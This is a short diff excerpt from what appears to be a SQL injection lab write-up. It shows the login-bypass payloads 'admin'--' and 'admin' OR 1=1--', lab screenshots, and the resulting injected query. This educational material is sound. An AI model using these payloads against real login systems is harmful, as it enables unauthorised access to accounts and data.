@@ -21,6 +21,7 @@ admin'--
 admin' OR 1=1--
 <img width="700" height="349" alt="SQL2_LAB1" src="https://github.com/user-attachments/assets/560d132c-7000-43d9-8ede-a05043071bce" />
 <img width="700" height="349" alt="Screenshot_1" src="https://github.com/user-attachments/assets/f57c3ac4-9ed5-4064-8271-b03a9ccf28ac" />
+
 - The query behind the scenes became something like:  
   ```sql
   SELECT * FROM users WHERE username = 'admin' OR 1=1--' AND password = '...';
